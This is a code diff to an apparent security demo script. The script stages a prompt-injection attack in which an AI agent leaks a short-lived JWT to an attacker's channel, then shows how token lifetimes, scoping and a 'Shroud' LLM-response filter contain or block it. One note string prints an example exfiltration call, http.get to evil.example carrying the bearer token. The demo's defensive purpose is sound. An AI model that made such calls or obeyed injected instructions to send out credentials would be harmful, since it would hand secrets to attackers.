@@ -31,6 +31,9 @@ const SLOW_DELAY_SECONDS = Number.parseInt(
     process.env.ATTACKER_SLOW_DELAY_SECONDS ?? "4",
     10,
 );
+const SHROUD_ENABLED = /^(1|true|yes|on)$/i.test(
+    process.env.DEMO_SHROUD ?? "",
+);
 
 async function main() {
     if (!API_KEY) {
@@ -47,11 +50,16 @@ async function main() {
     console.log("╔══════════════════════════════════════════════════════════════╗");
     console.log("║  1Claw — JWT TTL Defense (blast-radius containment)          ║");
     console.log("║  Prompt injection steals a token. 1Claw makes it cheap.      ║");
+    console.log(
+        SHROUD_ENABLED
+            ? "║  Mode: + Shroud LLM proxy (prevention at the boundary)       ║"
+            : "║  Mode: containment only (set DEMO_SHROUD=1 for prevention)   ║",
+    );
     console.log("╚══════════════════════════════════════════════════════════════╝");
 
     // ── ACT 0: provision vault + scoped agent + narrow policy ────
     section("Act 0 — Provision the agent", "uses your 1ck_ user key");
-    const res = await setup(BASE_URL, API_KEY!);
+    const res = await setup(BASE_URL, API_KEY!, { shroudEnabled: SHROUD_ENABLED });
 
     // The attacker listens on the exfil channel BEFORE the victim runs —
     // mirroring a real attacker who has already implanted their receiver.
@@ -77,25 +85,54 @@ async function main() {
             res.agentApiKey,
             res.vaultId,
             res.secretPath,
+            { shroudEnabled: res.shroudEnabled },
         );
 
-        const leak = await waitForLeak;
-        const secondsBetween = ((leak.leakedAt - victim.issuedAt) / 1000).toFixed(2);
-        note(`JWT reached attacker ${secondsBetween}s after issuance.`);
+        let attempts: AttackAttempt[] = [];
 
-        // ── ACT 2: hostile service attempts to weaponize the JWT ──
-        section(
-            "Act 2 — Attacker tries to pivot with the stolen JWT",
-            "no API key, no session — just the leaked token",
-        );
-        const attempts = await runAttacker(
-            BASE_URL,
-            leak.token,
-            res.vaultId,
-            res.secretPath,
-            res.sensitivePath,
-            SLOW_DELAY_SECONDS,
-        );
+        // The victim returns synchronously w.r.t. publishing to the
+        // exfil channel, so by this point we know definitively whether
+        // the leak happened. Swallow the long-running wait promise to
+        // avoid an unhandled rejection when we short-circuit.
+        waitForLeak.catch(() => {});
+
+        if (!victim.leaked) {
+            // Shroud intercepted the LLM response — the exfil channel
+            // never fires and the attacker has nothing to replay.
+            section(
+                "Act 2 — Attacker waits. Nothing arrives.",
+                "Shroud blocked the response at the LLM boundary",
+            );
+            note(
+                "The compromised tool-loop asked for http.get('https://evil.example/…Bearer <JWT>'),",
+            );
+            note(
+                "but Shroud inspected the LLM response first and refused to forward it.",
+            );
+            note(
+                "No credential ever surfaced on the exfil channel — attacker gets nothing.",
+            );
+        } else {
+            const leak = await waitForLeak;
+            const secondsBetween = (
+                (leak.leakedAt - victim.issuedAt) / 1000
+            ).toFixed(2);
+            note(`JWT reached attacker ${secondsBetween}s after issuance.`);
+
+            // ── ACT 2: hostile service attempts to weaponize the JWT ──
+            section(
+                "Act 2 — Attacker tries to pivot with the stolen JWT",
+                "no API key, no session — just the leaked token",
+            );
+            attempts = await runAttacker(
+                BASE_URL,
+                leak.token,
+                res.vaultId,
+                res.secretPath,
+                res.sensitivePath,
+                SLOW_DELAY_SECONDS,
+            );
+        }
 
         // ── ACT 3: what the human operator sees (audit log + rotate) ──
         section(
@@ -115,7 +152,7 @@ async function main() {
 
         // ── Summary ──
         section("Summary");
-        printSummary(attempts);
+        printSummary(attempts, { shroudEnabled: res.shroudEnabled, leaked: victim.leaked });
     } finally {
         await teardown(res);
     }
@@ -234,7 +271,25 @@ async function rotateAgentKey(
     note("JWTs already in flight still expire on their own in ≤3s; no new ones can be minted.");
 }
 
-function printSummary(attempts: AttackAttempt[]): void {
+function printSummary(
+    attempts: AttackAttempt[],
+    ctx: { shroudEnabled: boolean; leaked: boolean },
+): void {
+    if (ctx.shroudEnabled && !ctx.leaked) {
+        console.log(
+            "  ✓ prevented  LLM response filter     (shroud:response_filter + network_detection)",
+        );
+        console.log("");
+        console.log("  Blast radius: 0 secrets leaked, 0 attacker attempts occurred.");
+        console.log(
+            "  Shroud stopped the exfil at the LLM boundary — the JWT never left the agent.",
+        );
+        console.log(
+            "  TTL + scope + vault binding remain as layered defenses if Shroud ever fails open.",
+        );
+        return;
+    }
+
     for (const a of attempts) {
         const icon =
             a.outcome.kind === "success" ? "✗ stolen  "
@@ -260,6 +315,9 @@ function printSummary(attempts: AttackAttempt[]): void {
     console.log(`  Blast radius: ${stolen} secret leaked, ${blocked} attempts blocked.`);
     console.log(
         "  The stolen secret is scoped (single path, single vault) and revocable (rotate + re-policy).",
+    );
+    console.log(
+        "  Tip: set DEMO_SHROUD=1 to add Shroud at the LLM boundary — the leak gets prevented entirely.",
     );
 }
 
